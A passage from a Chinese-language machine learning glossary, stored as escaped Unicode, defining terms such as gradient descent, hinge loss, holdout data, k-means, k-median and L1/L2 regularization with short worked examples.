\uff0c\u5176\u4e2d\u7684\u6bcf\u4e2a \u8282\u70b9 \u5747\u4e0e\u4e0b\u4e00\u4e2a\u9690\u85cf\u5c42\u4e2d\u7684\u6bcf\u4e2a\u8282\u70b9\u76f8\u8fde\u3002 \u5168\u8fde\u63a5\u5c42\u53c8\u79f0\u4e3a \u5bc6\u96c6\u5c42 \u3002 8. G # 8.1. \u6cdb\u5316 (generalization) # \u6307\u7684\u662f\u6a21\u578b\u4f9d\u636e\u8bad\u7ec3\u65f6\u91c7\u7528\u7684\u6570\u636e\uff0c\u9488\u5bf9\u4ee5\u524d\u672a\u89c1\u8fc7\u7684\u65b0\u6570\u636e\u505a\u51fa\u6b63\u786e\u9884\u6d4b\u7684\u80fd\u529b\u3002 8.2. \u5e7f\u4e49\u7ebf\u6027\u6a21\u578b (generalized linear model) # \u6700\u5c0f\u4e8c\u4e58\u56de\u5f52 \u6a21\u578b\uff08\u57fa\u4e8e \u9ad8\u65af\u566a\u58f0 \uff09\u5411\u5176\u4ed6\u7c7b\u578b\u7684\u6a21\u578b\uff08\u57fa\u4e8e\u5176\u4ed6\u7c7b\u578b\u7684\u566a\u58f0\uff0c\u4f8b\u5982 \u6cca\u677e\u566a\u58f0 \u6216\u5206\u7c7b\u566a\u58f0\uff09\u8fdb\u884c\u7684\u4e00\u79cd\u6cdb\u5316\u3002\u5e7f\u4e49\u7ebf\u6027\u6a21\u578b\u7684\u793a\u4f8b\u5305\u62ec\uff1a \u903b\u8f91\u56de\u5f52 \u591a\u7c7b\u522b\u56de\u5f52 \u6700\u5c0f\u4e8c\u4e58\u56de\u5f52 \u53ef\u4ee5\u901a\u8fc7 \u51f8\u4f18\u5316 \u627e\u5230\u5e7f\u4e49\u7ebf\u6027\u6a21\u578b\u7684\u53c2\u6570\u3002 \u5e7f\u4e49\u7ebf\u6027\u6a21\u578b\u5177\u6709\u4ee5\u4e0b\u7279\u6027\uff1a \u6700\u4f18\u7684\u6700\u5c0f\u4e8c\u4e58\u56de\u5f52\u6a21\u578b\u7684\u5e73\u5747\u9884\u6d4b\u7ed3\u679c\u7b49\u4e8e\u8bad\u7ec3\u6570\u636e\u7684\u5e73\u5747\u6807\u7b7e\u3002 \u6700\u4f18\u7684\u903b\u8f91\u56de\u5f52\u6a21\u578b\u9884\u6d4b\u7684\u5e73\u5747\u6982\u7387\u7b49\u4e8e\u8bad\u7ec3\u6570\u636e\u7684\u5e73\u5747\u6807\u7b7e\u3002 \u5e7f\u4e49\u7ebf\u6027\u6a21\u578b\u7684\u529f\u80fd\u53d7\u5176\u7279\u5f81\u7684\u9650\u5236\u3002\u4e0e\u6df1\u5ea6\u6a21\u578b\u4e0d\u540c\uff0c\u5e7f\u4e49\u7ebf\u6027\u6a21\u578b\u65e0\u6cd5\"\u5b66\u4e60\u65b0\u7279\u5f81\"\u3002 8.3. \u68af\u5ea6 (gradient) # \u504f\u5bfc\u6570 \u76f8\u5bf9\u4e8e\u6240\u6709\u81ea\u53d8\u91cf\u7684\u5411\u91cf\u3002\u5728\u673a\u5668\u5b66\u4e60\u4e2d\uff0c\u68af\u5ea6\u662f\u6a21\u578b\u51fd\u6570\u504f\u5bfc\u6570\u7684\u5411\u91cf\u3002\u68af\u5ea6\u6307\u5411\u6700\u9ad8\u901f\u4e0a\u5347\u7684\u65b9\u5411\u3002 8.4. \u68af\u5ea6\u88c1\u526a (gradient clipping) # \u5728\u5e94\u7528 \u68af\u5ea6 \u503c\u4e4b\u524d\u5148\u8bbe\u7f6e\u5176\u4e0a\u9650\u3002\u68af\u5ea6\u88c1\u526a\u6709\u52a9\u4e8e\u786e\u4fdd\u6570\u503c\u7a33\u5b9a\u6027\u4ee5\u53ca\u9632\u6b62 \u68af\u5ea6\u7206\u70b8 \u3002 8.5. \u68af\u5ea6\u4e0b\u964d\u6cd5 (gradient descent) # \u4e00\u79cd\u901a\u8fc7\u8ba1\u7b97\u5e76\u4e14\u51cf\u5c0f\u68af\u5ea6\u5c06 \u635f\u5931 \u964d\u81f3\u6700\u4f4e\u7684\u6280\u672f\uff0c\u5b83\u4ee5\u8bad\u7ec3\u6570\u636e\u4e3a\u6761\u4ef6\uff0c\u6765\u8ba1\u7b97\u635f\u5931\u76f8\u5bf9\u4e8e\u6a21\u578b\u53c2\u6570\u7684\u68af\u5ea6\u3002\u901a\u4fd7\u6765\u8bf4\uff0c\u68af\u5ea6\u4e0b\u964d\u6cd5\u4ee5\u8fed\u4ee3\u65b9\u5f0f\u8c03\u6574\u53c2\u6570\uff0c\u9010\u6e10\u627e\u5230 \u6743\u91cd \u548c\u504f\u5dee\u7684\u6700\u4f73\u7ec4\u5408\uff0c\u4ece\u800c\u5c06\u635f\u5931\u964d\u81f3\u6700\u4f4e\u3002 8.6. \u56fe (graph) # TensorFlow \u4e2d\u7684\u4e00\u79cd\u8ba1\u7b97\u89c4\u8303\u3002\u56fe\u4e2d\u7684\u8282\u70b9\u8868\u793a\u64cd\u4f5c\u3002\u8fb9\u7f18\u5177\u6709\u65b9\u5411\uff0c\u8868\u793a\u5c06\u67d0\u9879\u64cd\u4f5c\u7684\u7ed3\u679c\uff08\u4e00\u4e2a \u5f20\u91cf \uff09\u4f5c\u4e3a\u4e00\u4e2a\u64cd\u4f5c\u6570\u4f20\u9012\u7ed9\u53e6\u4e00\u9879\u64cd\u4f5c\u3002\u53ef\u4ee5\u4f7f\u7528 TensorBoard \u76f4\u89c2\u5448\u73b0\u56fe\u3002 9. H # 9.1. \u542f\u53d1\u6cd5 (heuristic) # \u4e00\u79cd\u975e\u6700\u4f18\u4f46\u5b9e\u7528\u7684\u95ee\u9898\u89e3\u51b3\u65b9\u6848\uff0c\u8db3\u4ee5\u7528\u4e8e\u8fdb\u884c\u6539\u8fdb\u6216\u4ece\u4e2d\u5b66\u4e60\u3002 9.2. \u9690\u85cf\u5c42 (hidden layer) # \u795e\u7ecf\u7f51\u7edc \u4e2d\u7684\u5408\u6210\u5c42\uff0c\u4ecb\u4e8e \u8f93\u5165\u5c42 \uff08\u5373\u7279\u5f81\uff09\u548c \u8f93\u51fa\u5c42 \uff08\u5373\u9884\u6d4b\uff09\u4e4b\u95f4\u3002\u795e\u7ecf\u7f51\u7edc\u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u9690\u85cf\u5c42\u3002 9.3. \u5408\u9875\u635f\u5931\u51fd\u6570 (hinge loss) # \u4e00\u7cfb\u5217\u7528\u4e8e \u5206\u7c7b \u7684 \u635f\u5931 \u51fd\u6570\uff0c\u65e8\u5728\u627e\u5230\u8ddd\u79bb\u6bcf\u4e2a\u8bad\u7ec3\u6837\u672c\u90fd\u5c3d\u53ef\u80fd\u8fdc\u7684 \u51b3\u7b56\u8fb9\u754c \uff0c\u4ece\u800c\u4f7f\u6837\u672c\u548c\u8fb9\u754c\u4e4b\u95f4\u7684\u88d5\u5ea6\u6700\u5927\u5316\u3002 KSVM \u4f7f\u7528\u5408\u9875\u635f\u5931\u51fd\u6570\uff08\u6216\u76f8\u5173\u51fd\u6570\uff0c\u4f8b\u5982\u5e73\u65b9\u5408\u9875\u635f\u5931\u51fd\u6570\uff09\u3002\u5bf9\u4e8e\u4e8c\u5143\u5206\u7c7b\uff0c\u5408\u9875\u635f\u5931\u51fd\u6570\u7684\u5b9a\u4e49\u5982\u4e0b\uff1a loss = \\max{(0, 1 - (y' * y))} \u5176\u4e2d\"y'\"\u8868\u793a\u5206\u7c7b\u5668\u6a21\u578b\u7684\u539f\u59cb\u8f93\u51fa\uff1a y' = b + w_1 x_1 + w_2 x_2 + \\dots + w_n x_n \"y\"\u8868\u793a\u771f\u6807\u7b7e\uff0c\u503c\u4e3a -1 \u6216 +1\u3002 \u56e0\u6b64\uff0c\u5408\u9875\u635f\u5931\u4e0e (y * y') \u7684\u5173\u7cfb\u56fe\u5982\u4e0b\u6240\u793a\uff1a 9.4. \u7ef4\u6301\u6570\u636e (holdout data) # \u8bad\u7ec3\u671f\u95f4\u6545\u610f\u4e0d\u4f7f\u7528\uff08\"\u7ef4\u6301\"\uff09\u7684 \u6837\u672c \u3002 \u9a8c\u8bc1\u6570\u636e\u96c6 \u548c \u6d4b\u8bd5\u6570\u636e\u96c6 \u90fd\u5c5e\u4e8e\u7ef4\u6301\u6570\u636e\u3002\u7ef4\u6301\u6570\u636e\u6709\u52a9\u4e8e\u8bc4\u4f30\u6a21\u578b\u5411\u8bad\u7ec3\u65f6\u6240\u7528\u6570\u636e\u4e4b\u5916\u7684\u6570\u636e\u8fdb\u884c\u6cdb\u5316\u7684\u80fd\u529b\u3002\u4e0e\u57fa\u4e8e\u8bad\u7ec3\u6570\u636e\u96c6\u7684\u635f\u5931\u76f8\u6bd4\uff0c\u57fa\u4e8e\u7ef4\u6301\u6570\u636e\u96c6\u7684\u635f\u5931\u6709\u52a9\u4e8e\u66f4\u597d\u5730\u4f30\u7b97\u57fa\u4e8e\u672a\u89c1\u8fc7\u7684\u6570\u636e\u96c6\u7684\u635f\u5931\u3002 9.5. \u8d85\u53c2\u6570 (hyperparameter) # \u5728\u6a21\u578b\u8bad\u7ec3\u7684\u8fde\u7eed\u8fc7\u7a0b\u4e2d\uff0c\u60a8\u8c03\u8282\u7684\"\u65cb\u94ae\"\u3002\u4f8b\u5982\uff0c \u5b66\u4e60\u901f\u7387 \u5c31\u662f\u4e00\u79cd\u8d85\u53c2\u6570\u3002 \u4e0e \u53c2\u6570 \u76f8\u5bf9\u3002 9.6. \u8d85\u5e73\u9762 (hyperplane) # \u5c06\u4e00\u4e2a\u7a7a\u95f4\u5212\u5206\u4e3a\u4e24\u4e2a\u5b50\u7a7a\u95f4\u7684\u8fb9\u754c\u3002\u4f8b\u5982\uff0c\u5728\u4e8c\u7ef4\u7a7a\u95f4\u4e2d\uff0c\u76f4\u7ebf\u5c31\u662f\u4e00\u4e2a\u8d85\u5e73\u9762\uff0c\u5728\u4e09\u7ef4\u7a7a\u95f4\u4e2d\uff0c\u5e73\u9762\u5219\u662f\u4e00\u4e2a\u8d85\u5e73\u9762\u3002\u5728\u673a\u5668\u5b66\u4e60\u4e2d\u66f4\u5178\u578b\u7684\u662f\uff1a\u8d85\u5e73\u9762\u662f\u5206\u9694\u9ad8\u7ef4\u5ea6\u7a7a\u95f4\u7684\u8fb9\u754c\u3002 \u6838\u652f\u6301\u5411\u91cf\u673a \u5229\u7528\u8d85\u5e73\u9762\u5c06\u6b63\u7c7b\u522b\u548c\u8d1f\u7c7b\u522b\u533a\u5206\u5f00\u6765\uff08\u901a\u5e38\u662f\u5728\u6781\u9ad8\u7ef4\u5ea6\u7a7a\u95f4\u4e2d\uff09\u3002 10. I # 10.1. \u72ec\u7acb\u540c\u7b49\u5206\u5e03 (i.i.d, independently and identically distributed) # \u4ece\u4e0d\u4f1a\u6539\u53d8\u7684\u5206\u5e03\u4e2d\u63d0\u53d6\u7684\u6570\u636e\uff0c\u5176\u4e2d\u63d0\u53d6\u7684\u6bcf\u4e2a\u503c\u90fd\u4e0d\u4f9d\u8d56\u4e8e\u4e4b\u524d\u63d0\u53d6\u7684\u503c\u3002i.i.d. \u662f\u673a\u5668\u5b66\u4e60\u7684 \u7406\u60f3\u6c14\u4f53 - \u4e00\u79cd\u5b9e\u7528\u7684\u6570\u5b66\u7ed3\u6784\uff0c\u4f46\u5728\u73b0\u5b9e\u4e16\u754c\u4e2d\u51e0\u4e4e\u4ece\u672a\u53d1\u73b0\u8fc7\u3002\u4f8b\u5982\uff0c\u67d0\u4e2a\u7f51\u9875\u7684\u8bbf\u95ee\u8005\u5728\u77ed\u65f6\u95f4\u5185\u7684\u5206\u5e03\u53ef\u80fd\u4e3a i.i.d.\uff0c\u5373\u5206\u5e03\u5728\u8be5\u77ed\u65f6\u95f4\u5185\u6ca1\u6709\u53d8\u5316\uff0c\u4e14\u4e00\u4f4d\u7528\u6237\u7684\u8bbf\u95ee\u884c\u4e3a\u901a\u5e38\u4e0e\u53e6\u4e00\u4f4d\u7528\u6237\u7684\u8bbf\u95ee\u884c\u4e3a\u65e0\u5173\u3002\u4e0d\u8fc7\uff0c\u5982\u679c\u5c06\u65f6\u95f4\u7a97\u53e3\u6269\u5927\uff0c\u7f51\u9875\u8bbf\u95ee\u8005\u7684\u5206\u5e03\u53ef\u80fd\u5448\u73b0\u51fa\u5b63\u8282\u6027\u53d8\u5316\u3002 10.2. \u63a8\u65ad (inference) # \u5728\u673a\u5668\u5b66\u4e60\u4e2d\uff0c\u63a8\u65ad\u901a\u5e38\u6307\u4ee5\u4e0b\u8fc7\u7a0b\uff1a\u901a\u8fc7\u5c06\u8bad\u7ec3\u8fc7\u7684\u6a21\u578b\u5e94\u7528\u4e8e \u65e0\u6807\u7b7e\u6837\u672c \u6765\u505a\u51fa\u9884\u6d4b\u3002\u5728\u7edf\u8ba1\u5b66\u4e2d\uff0c\u63a8\u65ad\u662f\u6307\u5728\u67d0\u4e9b\u89c2\u6d4b\u6570\u636e\u6761\u4ef6\u4e0b\u62df\u5408\u5206\u5e03\u53c2\u6570\u7684\u8fc7\u7a0b\u3002\uff08\u8bf7\u53c2\u9605 \u7ef4\u57fa\u767e\u79d1\u4e2d\u6709\u5173\u7edf\u8ba1\u5b66\u63a8\u65ad\u7684\u6587\u7ae0 \u3002\uff09 10.3. \u8f93\u5165\u51fd\u6570 (input function) # \u5728 TensorFlow \u4e2d\uff0c\u7528\u4e8e\u5c06\u8f93\u5165\u6570\u636e\u8fd4\u56de\u5230 Estimator \u7684\u8bad\u7ec3\u3001\u8bc4\u4f30\u6216\u9884\u6d4b\u65b9\u6cd5\u7684\u51fd\u6570\u3002\u4f8b\u5982\uff0c\u8bad\u7ec3\u8f93\u5165\u51fd\u6570\u4f1a\u8fd4\u56de \u8bad\u7ec3\u96c6 \u4e2d\u7684 \u4e00\u6279 \u7279\u5f81\u548c\u6807\u7b7e\u3002 10.4. \u8f93\u5165\u5c42 (input layer) # \u795e\u7ecf\u7f51\u7edc \u4e2d\u7684\u7b2c\u4e00\u5c42\uff08\u63a5\u6536\u8f93\u5165\u6570\u636e\u7684\u5c42\uff09\u3002 10.5. \u5b9e\u4f8b (instance) # \u4e0e \u6837\u672c \u7684\u542b\u4e49\u76f8\u540c\u3002 10.6. \u53ef\u89e3\u91ca\u6027 (interpretability) # \u6a21\u578b\u7684\u9884\u6d4b\u53ef\u89e3\u91ca\u7684\u96be\u6613\u7a0b\u5ea6\u3002\u6df1\u5ea6\u6a21\u578b\u901a\u5e38\u4e0d\u53ef\u89e3\u91ca\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f88\u96be\u5bf9\u6df1\u5ea6\u6a21\u578b\u7684\u4e0d\u540c\u5c42\u8fdb\u884c\u89e3\u91ca\u3002\u76f8\u6bd4\u4e4b\u4e0b\uff0c\u7ebf\u6027\u56de\u5f52\u6a21\u578b\u548c \u5bbd\u5ea6\u6a21\u578b \u7684\u53ef\u89e3\u91ca\u6027\u901a\u5e38\u8981\u597d\u5f97\u591a\u3002 10.7. \u8bc4\u5206\u8005\u95f4\u4e00\u81f4\u6027\u4fe1\u5ea6 (inter-rater agreement) # \u4e00\u79cd\u8861\u91cf\u6307\u6807\uff0c\u7528\u4e8e\u8861\u91cf\u5728\u6267\u884c\u67d0\u9879\u4efb\u52a1\u65f6\u8bc4\u5206\u8005\u8fbe\u6210\u4e00\u81f4\u7684\u9891\u7387\u3002\u5982\u679c\u8bc4\u5206\u8005\u672a\u8fbe\u6210\u4e00\u81f4\uff0c\u5219\u53ef\u80fd\u9700\u8981\u6539\u8fdb\u4efb\u52a1\u8bf4\u660e\u3002\u6709\u65f6\u4e5f\u79f0\u4e3a\u6ce8\u91ca\u8005\u95f4\u4e00\u81f4\u6027\u4fe1\u5ea6\u6216\u8bc4\u5206\u8005\u95f4\u53ef\u9760\u6027\u4fe1\u5ea6\u3002\u53e6\u8bf7\u53c2\u9605 Cohen's kappa \uff08\u6700\u70ed\u95e8\u7684\u8bc4\u5206\u8005\u95f4\u4e00\u81f4\u6027\u4fe1\u5ea6\u8861\u91cf\u6307\u6807\u4e4b\u4e00\uff09\u3002 10.8. \u8fed\u4ee3 (iteration) # \u6a21\u578b\u7684\u6743\u91cd\u5728\u8bad\u7ec3\u671f\u95f4\u7684\u4e00\u6b21\u66f4\u65b0\u3002\u8fed\u4ee3\u5305\u542b\u8ba1\u7b97\u53c2\u6570\u5728\u5355 \u6279\u6b21 \u6570\u636e\u4e0a\u7684\u68af\u5ea6\u635f\u5931\u3002 11. K # 11.1. k-means # \u4e00\u79cd\u70ed\u95e8\u7684 \u805a\u7c7b \u7b97\u6cd5\uff0c\u7528\u4e8e\u5bf9\u975e\u76d1\u7763\u5f0f\u5b66\u4e60\u4e2d\u7684\u6837\u672c\u8fdb\u884c\u5206\u7ec4\u3002k-means \u7b97\u6cd5\u57fa\u672c\u4e0a\u4f1a\u6267\u884c\u4ee5\u4e0b\u64cd\u4f5c\uff1a \u4ee5\u8fed\u4ee3\u65b9\u5f0f\u786e\u5b9a\u6700\u4f73\u7684 k \u4e2d\u5fc3\u70b9\uff08\u79f0\u4e3a \u5f62\u5fc3 \uff09\u3002 \u5c06\u6bcf\u4e2a\u6837\u672c\u5206\u914d\u5230\u6700\u8fd1\u7684\u5f62\u5fc3\u3002\u4e0e\u540c\u4e00\u4e2a\u5f62\u5fc3\u8ddd\u79bb\u6700\u8fd1\u7684\u6837\u672c\u5c5e\u4e8e\u540c\u4e00\u4e2a\u7ec4\u3002 k-means \u7b97\u6cd5\u4f1a\u6311\u9009\u5f62\u5fc3\u4f4d\u7f6e\uff0c\u4ee5\u6700\u5927\u9650\u5ea6\u5730\u51cf\u5c0f\u6bcf\u4e2a\u6837\u672c\u4e0e\u5176\u6700\u63a5\u8fd1\u5f62\u5fc3\u4e4b\u95f4\u7684\u8ddd\u79bb\u7684\u7d2f\u79ef\u5e73\u65b9\u3002 \u4ee5\u4e0b\u9762\u7684\u5c0f\u72d7\u9ad8\u5ea6\u4e0e\u5c0f\u72d7\u5bbd\u5ea6\u7684\u5173\u7cfb\u56fe\u4e3a\u4f8b\uff1a \u5982\u679c k=3\uff0c\u5219 k-means \u7b97\u6cd5\u4f1a\u786e\u5b9a\u4e09\u4e2a\u5f62\u5fc3\u3002\u6bcf\u4e2a\u6837\u672c\u90fd\u88ab\u5206\u914d\u5230\u4e0e\u5176\u6700\u63a5\u8fd1\u7684\u5f62\u5fc3\uff0c\u6700\u7ec8\u4ea7\u751f\u4e09\u4e2a\u7ec4\uff1a \u5047\u8bbe\u5236\u9020\u5546\u60f3\u8981\u786e\u5b9a\u5c0f\u3001\u4e2d\u548c\u5927\u53f7\u72d7\u6bdb\u8863\u7684\u7406\u60f3\u5c3a\u5bf8\u3002\u5728\u8be5\u805a\u7c7b\u4e2d\uff0c\u4e09\u4e2a\u5f62\u5fc3\u7528\u4e8e\u6807\u8bc6\u6bcf\u53ea\u72d7\u7684\u5e73\u5747\u9ad8\u5ea6\u548c\u5e73\u5747\u5bbd\u5ea6\u3002\u56e0\u6b64\uff0c\u5236\u9020\u5546\u53ef\u80fd\u5e94\u8be5\u6839\u636e\u8fd9\u4e09\u4e2a\u5f62\u5fc3\u786e\u5b9a\u6bdb\u8863\u5c3a\u5bf8\u3002\u8bf7\u6ce8\u610f\uff0c\u805a\u7c7b\u7684\u5f62\u5fc3\u901a\u5e38\u4e0d\u662f\u805a\u7c7b\u4e2d\u7684\u6837\u672c\u3002 \u4e0a\u56fe\u663e\u793a\u4e86 k-means \u5e94\u7528\u4e8e\u4ec5\u5177\u6709\u4e24\u4e2a\u7279\u5f81\uff08\u9ad8\u5ea6\u548c\u5bbd\u5ea6\uff09\u7684\u6837\u672c\u3002\u8bf7\u6ce8\u610f\uff0ck-means \u53ef\u4ee5\u8de8\u591a\u4e2a\u7279\u5f81\u4e3a\u6837\u672c\u5206\u7ec4\u3002 11.2. k-median # \u4e0e k-means \u7d27\u5bc6\u76f8\u5173\u7684\u805a\u7c7b\u7b97\u6cd5\u3002\u4e24\u8005\u7684\u5b9e\u9645\u533a\u522b\u5982\u4e0b\uff1a \u5bf9\u4e8e k-means\uff0c\u786e\u5b9a\u5f62\u5fc3\u7684\u65b9\u6cd5\u662f\uff0c\u6700\u5927\u9650\u5ea6\u5730\u51cf\u5c0f\u5019\u9009\u5f62\u5fc3\u4e0e\u5b83\u7684\u6bcf\u4e2a\u6837\u672c\u4e4b\u95f4\u7684\u8ddd\u79bb\u5e73\u65b9\u548c\u3002 \u5bf9\u4e8e k-median\uff0c\u786e\u5b9a\u5f62\u5fc3\u7684\u65b9\u6cd5\u662f\uff0c\u6700\u5927\u9650\u5ea6\u5730\u51cf\u5c0f\u5019\u9009\u5f62\u5fc3\u4e0e\u5b83\u7684\u6bcf\u4e2a\u6837\u672c\u4e4b\u95f4\u7684\u8ddd\u79bb\u603b\u548c\u3002 \u8bf7\u6ce8\u610f\uff0c\u8ddd\u79bb\u7684\u5b9a\u4e49\u4e5f\u6709\u6240\u4e0d\u540c\uff1a k-means \u91c7\u7528\u4ece\u5f62\u5fc3\u5230\u6837\u672c\u7684 \u6b27\u51e0\u91cc\u5f97\u8ddd\u79bb \u3002\uff08\u5728\u4e8c\u7ef4\u7a7a\u95f4\u4e2d\uff0c\u6b27\u51e0\u91cc\u5f97\u8ddd\u79bb\u5373\u4f7f\u7528\u52fe\u80a1\u5b9a\u7406\u6765\u8ba1\u7b97\u659c\u8fb9\u3002\uff09\u4f8b\u5982\uff0c(2,2) \u4e0e (5,-2) \u4e4b\u95f4\u7684 k-means \u8ddd\u79bb\u4e3a\uff1a \\text{\u6b27\u51e0\u91cc\u5fb7\u8ddd\u79bb} = \\sqrt[]{(2 - 5)^2 + (2 - (-2))^2} = 5 k-median \u91c7\u7528\u4ece\u5f62\u5fc3\u5230\u6837\u672c\u7684 \u66fc\u54c8\u987f\u8ddd\u79bb \u3002\u8fd9\u4e2a\u8ddd\u79bb\u662f\u6bcf\u4e2a\u7ef4\u5ea6\u4e2d\u7edd\u5bf9\u5dee\u5f02\u503c\u7684\u603b\u548c\u3002\u4f8b\u5982\uff0c(2,2) \u4e0e (5,-2) \u4e4b\u95f4\u7684 k-median \u8ddd\u79bb\u4e3a\uff1a \\text{\u66fc\u54c8\u987f\u8ddd\u79bb} = |2 - 5| + |2 - (-2)| = 7 11.3. Keras # \u4e00\u79cd\u70ed\u95e8\u7684 Python \u673a\u5668\u5b66\u4e60 API\u3002 Keras \u80fd\u591f\u5728\u591a\u79cd\u6df1\u5ea6\u5b66\u4e60\u6846\u67b6\u4e0a\u8fd0\u884c\uff0c\u5176\u4e2d\u5305\u62ec TensorFlow\uff08\u5728\u8be5\u6846\u67b6\u4e0a\uff0cKeras \u4f5c\u4e3a tf.keras \u63d0\u4f9b\uff09\u3002 11.4. \u6838\u652f\u6301\u5411\u91cf\u673a (KSVM, Kernel Support Vector Machines) # \u4e00\u79cd\u5206\u7c7b\u7b97\u6cd5\uff0c\u65e8\u5728\u901a\u8fc7\u5c06\u8f93\u5165\u6570\u636e\u5411\u91cf\u6620\u5c04\u5230\u66f4\u9ad8\u7ef4\u5ea6\u7684\u7a7a\u95f4\uff0c\u6765\u6700\u5927\u5316 \u6b63\u7c7b\u522b \u548c \u8d1f\u7c7b\u522b \u4e4b\u95f4\u7684\u88d5\u5ea6\u3002\u4ee5\u67d0\u4e2a\u8f93\u5165\u6570\u636e\u96c6\u5305\u542b\u4e00\u767e\u4e2a\u7279\u5f81\u7684\u5206\u7c7b\u95ee\u9898\u4e3a\u4f8b\u3002\u4e3a\u4e86\u6700\u5927\u5316\u6b63\u7c7b\u522b\u548c\u8d1f\u7c7b\u522b\u4e4b\u95f4\u7684\u88d5\u5ea6\uff0cKSVM \u53ef\u4ee5\u5728\u5185\u90e8\u5c06\u8fd9\u4e9b\u7279\u5f81\u6620\u5c04\u5230\u767e\u4e07\u7ef4\u5ea6\u7684\u7a7a\u95f4\u3002KSVM \u4f7f\u7528 \u5408\u9875\u635f\u5931\u51fd\u6570 \u3002 12. L # 12.1. L_1 \u635f\u5931\u51fd\u6570 ( L_1 loss) # \u4e00\u79cd \u635f\u5931 \u51fd\u6570\uff0c\u57fa\u4e8e\u6a21\u578b\u9884\u6d4b\u7684\u503c\u4e0e \u6807\u7b7e \u7684\u5b9e\u9645\u503c\u4e4b\u5dee\u7684\u7edd\u5bf9\u503c\u3002\u4e0e L_2 \u635f\u5931\u51fd\u6570 \u76f8\u6bd4\uff0c L_1 \u635f\u5931\u51fd\u6570\u5bf9\u79bb\u7fa4\u503c\u7684\u654f\u611f\u6027\u5f31\u4e00\u4e9b\u3002 12.2. L_1 \u6b63\u5219\u5316 ( L_1 regularization) # \u4e00\u79cd \u6b63\u5219\u5316 \uff0c\u6839\u636e\u6743\u91cd\u7684\u7edd\u5bf9\u503c\u7684\u603b\u548c\u6765\u60e9\u7f5a\u6743\u91cd\u3002\u5728\u4f9d\u8d56 \u7a00\u758f\u7279\u5f81 \u7684\u6a21\u578b\u4e2d\uff0c L_1 \u6b63\u5219\u5316\u6709\u52a9\u4e8e\u4f7f\u4e0d\u76f8\u5173\u6216\u51e0\u4e4e\u4e0d\u76f8\u5173\u7684\u7279\u5f81\u7684\u6743\u91cd\u6b63\u597d\u4e3a 0\uff0c\u4ece\u800c\u5c06\u8fd9\u4e9b\u7279\u5f81\u4ece\u6a21\u578b\u4e2d\u79fb\u9664\u3002\u4e0e L_2 \u6b63\u5219\u5316 \u76f8\u5bf9\u3002 12.3. L_2 \u635f\u5931\u51fd\u6570 ( L_2 loss) # \u8bf7\u53c2\u9605 \u5e73\u65b9\u635f\u5931\u51fd\u6570 \u3002 12.4. L_2 \u6b63\u5219\u5316 ( L_2 regularization) # \u4e00\u79cd \u6b63\u5219\u5316 \uff0c\u6839\u636e\u6743\u91cd\u7684\u5e73\u65b9\u548c\u6765\u60e9\u7f5a\u6743\u91cd\u3002 L_2 \u6b63\u5219\u5316\u6709\u52a9\u4e8e\u4f7f\u79bb\u7fa4\u503c\uff08\u5177\u6709\u8f83\u5927\u6b63\u503c\u6216\u8f83\u5c0f\u8d1f\u503c\uff09\u6743\u91cd\u63a5\u8fd1\u4e8e 0\uff0c\u4f46\u53c8\u4e0d\u6b63\u597d\u4e3a 0\u3002\uff08\u4e0e L1 \u6b63\u5219\u5316 \u76f8\u5bf9\u3002\uff09\u5728\u7ebf\u6027\u6a21\u578b\u4e2d\uff0c L_2 \u6b63\u5219\u5316\u59cb\u7ec8\u53ef\u4ee5\u6539\u8fdb\u6cdb\u5316\u3002 12.5. \u6807\u7b7e (label) # \u5728\u76d1\u7763\u5f0f\u5b66\u4e60\u4e2d\uff0c\u6807\u7b7e\u6307 \u6837\u672c \u7684\"\u7b54\u6848\"\u6216\"\u7ed3\u679c\"\u90e8\u5206\u3002\u6709\u6807\u7b7e\u6570\u636e\u96c6\u4e2d\u7684\u6bcf\u4e2a\u6837\u672c\u90fd\u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u7279\u5f81\u4ee5\u53ca\u4e00\u4e2a\u6807\u7b7e\u3002\u4f8b\u5982\uff0c\u5728\u623f\u5c4b\u6570\u636e\u96c6\u4e2d\uff0c\u7279\u5f81\u53ef\u80fd\u5305\u62ec\u5367\u5ba4\u6570\u3001\u536b\u751f\u95f4\u6570\u4ee5\u53ca\u623f\u9f84\uff0c\u800c\u6807\u7b7e\u5219\u53ef\u80fd\u662f\u623f\u4ef7\u3002\u5728\u5783\u573e\u90ae\u4ef6\u68c0\u6d4b\u6570\u636e\u96c6\u4e2d\uff0c\u7279\u5f81\u53ef\u80fd\u5305\u62ec\u4e3b\u9898\u884c\u3001\u53d1\u4ef6\u4eba\u4ee5\u53ca\u7535\u5b50\u90ae\u4ef6\u672c\u8eab\uff0c\u800c\u6807\u7b7e\u5219\u53ef\u80fd\u662f\"\u5783\u573e\u90ae\u4ef6\"\u6216\"\u975e\u5783\u573e\u90ae\u4ef6\"\u3002 12.6. \u6709\u6807\u7b7e\u6837\u672c (labeled example) # \u5305\u542b \u7279\u5f81 \u548c \u6807\u7b7e \u7684\u6837\u672c\u3002\u5728\u76d1\u7763\u5f0f\u8bad\u7ec3\u4e2d\uff0c\u6a21\u578b\u4ece\u6709\u6807\u7b7e\u6837\u672c\u4e2d\u5b66\u4e60\u89c4\u5f8b\u3002 12.7. lambda # \u4e0e \u6b63\u5219\u5316\u7387 \u7684\u542b\u4e49\u76f8\u540c\u3002 \uff08\u591a\u542b\u4e49\u672f\u8bed\uff0c\u6211\u4eec\u5728\u6b64\u5173\u6ce8\u7684\u662f\u8be5\u672f\u8bed\u5728 \u6b63\u5219\u5316 \u4e2d\u7684\u5b9a\u4e49\u3002\uff09 12.8. \u5c42 (layer) # \u795e\u7ecf\u7f51\u7edc \u4e2d\u7684\u4e00\u7ec4 \u795e\u7ecf\u5143 \uff0c\u8d1f\u8d23\u5904\u7406\u4e00\u7ec4\u8f93\u5165\u7279\u5f81\uff0c\u6216\u4e00\u7ec4\u795e\u7ecf\u5143\u7684\u8f93\u51fa\u3002 \u6b64\u5916\u8fd8\u6307 TensorFlow \u4e2d\u7684\u62bd\u8c61\u5c42\u3002\u5c42\u662f Python \u51fd\u6570\uff0c\u4ee5 \u5f20\u91cf \u548c\u914d\u7f6e\u9009\u9879\u4f5c\u4e3a\u8f93\u5165\uff0c\u7136\u540e\u751f\u6210\u5176\u4ed6\u5f20\u91cf\u4f5c\u4e3a\u8f93\u51fa\u3002\u5f53\u5fc5\u8981\u7684\u5f20\u91cf\u7ec4\u5408\u8d77\u6765\u540e\uff0c\u7528\u6237\u4fbf\u53ef\u4ee5\u901a\u8fc7 \u6a21\u578b\u51fd\u6570 